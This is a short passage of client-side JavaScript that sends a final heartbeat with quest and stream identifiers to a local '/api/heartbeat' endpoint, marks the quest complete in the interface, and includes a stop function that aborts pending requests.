            ...payloadBase(),
            quest_id: qid,
            stream_key: sk,
            terminal: true,
        };
        if (quest.application_id) termBody.application_id = quest.application_id;
        await fetch('/api/heartbeat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(termBody),
        });
    } catch (e) {}
    if (!stopFlag) {
        updateCardProgress(qid, needed, needed);
        addLog(`Completed: ${quest.name}`, 'ok');
    }
}

function doStop() {
    stopFlag = true;
    activeControllers.forEach(c => c.abort());
    addLog('Stopping...', 'warn');
    $('stopBtn').disabled = true;
}
